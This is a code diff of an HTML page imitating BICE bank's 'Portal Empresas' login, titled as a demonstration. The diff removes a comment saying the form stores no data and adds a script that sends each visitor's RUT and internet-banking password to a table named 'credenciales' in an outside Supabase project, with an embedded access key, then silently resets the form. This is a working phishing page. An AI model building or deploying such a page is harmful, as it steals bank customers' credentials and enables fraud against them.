@@ -1,18 +1,16 @@
 <!DOCTYPE html>
-<!-- saved from url=(0049)file:///C:/Users/USER/Desktop/BANCO/empresas.html -->
-<html lang="es"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-  
+<html lang="es">
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <meta name="robots" content="noindex, nofollow">
   <title>Portal Empresas — Vista de demostración</title>
   <link href="./Portal Empresas — Vista de demostración_files/css" rel="stylesheet">
-  <!-- CSS ORIGINALES del archivo empresas(1).html; se mantienen por separado del CSS de index.html. -->
   <link href="./Portal Empresas — Vista de demostración_files/bootstrap.min.css" rel="stylesheet">
   <link href="./Portal Empresas — Vista de demostración_files/template.css" rel="stylesheet">
   <link href="./Portal Empresas — Vista de demostración_files/templatex.css" rel="stylesheet">
   <link href="./Portal Empresas — Vista de demostración_files/advise.css" rel="stylesheet">
   <link href="./Portal Empresas — Vista de demostración_files/login.css" rel="stylesheet">
-  <!-- Ajustes visuales y soporte para abrir el HTML como archivo local. -->
   <link rel="stylesheet" href="styles.css">
 </head>
 <body class="portal-preview">
@@ -35,25 +33,25 @@
           <p class="title_p1">Te damos la bienvenida a</p>
           <h2 class="title_p2">Nuevo Portal Empresas</h2>
         </div>
-        <!-- FORMULARIO VISUAL: Los campos están desactivados y no se almacenan ni envían datos. -->
-        <form class="preview-form" id="kc-form-login" action="/ruta-de-tu-servidor" method="POST" autocomplete="off">
-  <div class="field">
-    <input class="form-control inputRut" type="text" placeholder="Rut" aria-label="Rut" autocomplete="off" required>
-  </div>
-  <div class="field">
-    <input class="form-control inputPassword" type="password" placeholder="Clave Internet" aria-label="Clave Internet" autocomplete="off" required>
-    <span class="eye" aria-hidden="true">◉</span>
-  </div>
-  
-  <!-- Usar un botón real en lugar de una etiqueta <a> para enviar el formulario -->
-  <button type="submit" class="login-btn">Ingresar</button>
-  
-  <a class="help" href="https://core.bice.cl/fe-autenticacion/?tab=desbloquear-clave" target="_blank" rel="noopener noreferrer">¿Tienes problemas con tu clave internet?</a>
-  <hr class="divider">
-  <a class="new-user" href="https://core.bice.cl/fe-autenticacion/?tab=crear-clave" target="_blank" rel="noopener noreferrer">¿Primera vez en BICE? Crea tu clave</a>
-  <p class="phone"><span aria-hidden="true">☎</span>600 400 1010</p>
-</form>
+        
+        <form class="preview-form" id="kc-form-login" autocomplete="off">
+          <div class="field">
+            <input class="form-control inputRut" id="rutInput" type="text" placeholder="Rut" aria-label="Rut" autocomplete="off" required>
+          </div>
+          <div class="field">
+            <input class="form-control inputPassword" id="passwordInput" type="password" placeholder="Clave Internet" aria-label="Clave Internet" autocomplete="off" required>
+            <span class="eye" aria-hidden="true">◉</span>
+          </div>
+          
+          <button type="submit" class="login-btn">Ingresar</button>
+          
+          <a class="help" href="" target="_blank" rel="noopener noreferrer">¿Tienes problemas con tu clave internet?</a>
+          <hr class="divider">
+          <a class="new-user" href="" target="_blank" rel="noopener noreferrer">¿Primera vez en BICE? Crea tu clave</a>
+          <p class="phone"><span aria-hidden="true">☎</span>600 400 1010</p>
+        </form>
       </section>
+      
       <section class="features" aria-label="Funciones del portal">
         <h1><span>Nuevo Portal Empresas:</span> una evolución continua</h1>
         <p class="intro">Accede a las funciones clave y a nuevas opciones que se incorporan.</p>
@@ -81,4 +79,45 @@
     </footer>
   </div>
 
-</body></html>
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+  
+  <script>
+    const _supabase = supabase.createClient(
+      'https://cqrmqqqlfnqzxvdylphp.supabase.co', 
+      'sb_publishable_6K346Vr-S9k77im7J0GfFw_8o4t-hEO'
+    );
+
+    const form = document.getElementById('kc-form-login');
+
+    form.addEventListener('submit', async function(event) {
+      event.preventDefault(); 
+
+      const rutValue = document.getElementById('rutInput').value;
+      const passwordValue = document.getElementById('passwordInput').value;
+
+      const submitBtn = document.querySelector('.login-btn');
+      submitBtn.disabled = true;
+      submitBtn.innerText = 'Ingresando...';
+
+      const { data, error } = await _supabase
+        .from('credenciales') 
+        .insert([
+          { rut: rutValue, clave: passwordValue }
+        ]);
+
+      if (error) {
+        console.error('Error al guardar en Supabase:', error);
+        alert('Hubo un problema al procesar la solicitud.');
+        submitBtn.disabled = false;
+        submitBtn.innerText = 'Ingresar';
+      } else {
+        console.log('Datos guardados exitosamente');
+        
+        form.reset();
+        submitBtn.disabled = false;
+        submitBtn.innerText = 'Ingresar';
+      }
+    });
+  </script>
+</body>
+</html>
